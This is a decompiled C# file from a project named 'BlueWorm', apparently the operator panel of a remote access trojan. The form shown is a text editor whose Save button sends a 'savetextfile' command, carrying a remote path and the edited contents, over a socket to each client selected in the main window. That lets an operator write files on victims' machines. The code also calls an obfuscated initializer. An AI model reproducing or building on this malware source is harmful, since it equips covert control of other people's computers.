using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace BlueWorm
{
	// Token: 0x02000012 RID: 18
	[DesignerGenerated]
	public partial class Form5 : Form
	{
		// Token: 0x060000FB RID: 251 RVA: 0x0000278A File Offset: 0x0000098A
		// Note: this type is marked as 'beforefieldinit'.
		[DebuggerNonUserCode]
		static Form5()
		{
			Class9.jBg04XuzOGhUk();
			Form5.list_0 = new List<WeakReference>();
		}

		// Token: 0x060000FC RID: 252 RVA: 0x0000279B File Offset: 0x0000099B
		public Form5()
		{
			Class9.jBg04XuzOGhUk();
			base..ctor();
			base.Load += this.Form5_Load;
			Form5.smethod_0(this);
			this.yy = "||";
			this.InitializeComponent();
		}

		// Token: 0x060000FD RID: 253 RVA: 0x00008600 File Offset: 0x00006800
		[DebuggerNonUserCode]
		private static void smethod_0(object object_0)
		{
			List<WeakReference> obj = Form5.list_0;
			checked
			{
				lock (obj)
				{
					if (Form5.list_0.Count == Form5.list_0.Capacity)
					{
						int num = 0;
						int num2 = 0;
						int num3 = Form5.list_0.Count - 1;
						int num4 = num2;
						for (;;)
						{
							int num5 = num4;
							int num6 = num3;
							if (num5 > num6)
							{
								break;
							}
							WeakReference weakReference = Form5.list_0[num4];
							if (weakReference.IsAlive)
							{
								if (num4 != num)
								{
									Form5.list_0[num] = Form5.list_0[num4];
								}
								num++;
							}
							num4++;
						}
						Form5.list_0.RemoveRange(num, Form5.list_0.Count - num);
						Form5.list_0.Capacity = Form5.list_0.Count;
					}
					Form5.list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
				}
			}
		}

		// Token: 0x17000037 RID: 55
		// (get) Token: 0x06000100 RID: 256 RVA: 0x00008A3C File Offset: 0x00006C3C
		// (set) Token: 0x06000101 RID: 257 RVA: 0x00008A54 File Offset: 0x00006C54
		internal virtual ToolStripMenuItem SaveToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._SaveToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.SaveToolStripMenuItem_Click);
				if (this._SaveToolStripMenuItem != null)
				{
					this._SaveToolStripMenuItem.Click -= value2;
				}
				this._SaveToolStripMenuItem = value;
				if (this._SaveToolStripMenuItem != null)
				{
					this._SaveToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x17000038 RID: 56
		// (get) Token: 0x06000102 RID: 258 RVA: 0x00008AAC File Offset: 0x00006CAC
		// (set) Token: 0x06000103 RID: 259 RVA: 0x000027D2 File Offset: 0x000009D2
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000039 RID: 57
		// (get) Token: 0x06000104 RID: 260 RVA: 0x00008AC4 File Offset: 0x00006CC4
		// (set) Token: 0x06000105 RID: 261 RVA: 0x000027DB File Offset: 0x000009DB
		internal virtual ToolStripSplitButton ToolStripSplitButton1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStripSplitButton1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStripSplitButton1 = value;
			}
		}

		// Token: 0x1700003A RID: 58
		// (get) Token: 0x06000106 RID: 262 RVA: 0x00008ADC File Offset: 0x00006CDC
		// (set) Token: 0x06000107 RID: 263 RVA: 0x00008AF4 File Offset: 0x00006CF4
		internal virtual ToolStripMenuItem ExitToolStripMenuItem
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ExitToolStripMenuItem;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.ExitToolStripMenuItem_Click);
				if (this._ExitToolStripMenuItem != null)
				{
					this._ExitToolStripMenuItem.Click -= value2;
				}
				this._ExitToolStripMenuItem = value;
				if (this._ExitToolStripMenuItem != null)
				{
					this._ExitToolStripMenuItem.Click += value2;
				}
			}
		}

		// Token: 0x1700003B RID: 59
		// (get) Token: 0x06000108 RID: 264 RVA: 0x00008B4C File Offset: 0x00006D4C
		// (set) Token: 0x06000109 RID: 265 RVA: 0x000027E4 File Offset: 0x000009E4
		internal virtual ToolStrip ToolStrip1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._ToolStrip1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._ToolStrip1 = value;
			}
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00008B64 File Offset: 0x00006D64
		private void SaveToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				foreach (object obj in Class2.umavbhbSM.Form1.l1.SelectedItems)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					Class2.umavbhbSM.Form1.s.Send(this.sock, string.Concat(new string[]
					{
						"savetextfile",
						this.yy,
						this.pathoftext,
						this.yy,
						this.TextBox1.Text
					}));
				}
			}
			finally
			{
				IEnumerator enumerator;
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600010B RID: 267 RVA: 0x000026AF File Offset: 0x000008AF
		private void ExitToolStripMenuItem_Click(object sender, EventArgs e)
		{
			this.Close();
		}

		// Token: 0x0600010C RID: 268 RVA: 0x000025ED File Offset: 0x000007ED
		private void Form5_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x04000061 RID: 97
		private static List<WeakReference> list_0;

		// Token: 0x04000063 RID: 99
		[AccessedThroughProperty("SaveToolStripMenuItem")]
		private ToolStripMenuItem _SaveToolStripMenuItem;

		// Token: 0x04000064 RID: 100
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x04000065 RID: 101
		[AccessedThroughProperty("ToolStripSplitButton1")]
		private ToolStripSplitButton _ToolStripSplitButton1;

		// Token: 0x04000066 RID: 102
		[AccessedThroughProperty("ExitToolStripMenuItem")]
		private ToolStripMenuItem _ExitToolStripMenuItem;

		// Token: 0x04000067 RID: 103
		[AccessedThroughProperty("ToolStrip1")]
		private ToolStrip _ToolStrip1;

		// Token: 0x04000068 RID: 104
		public int sock;

		// Token: 0x04000069 RID: 105
		public string pathoftext;

		// Token: 0x0400006A RID: 106
		public string yy;
	}
}
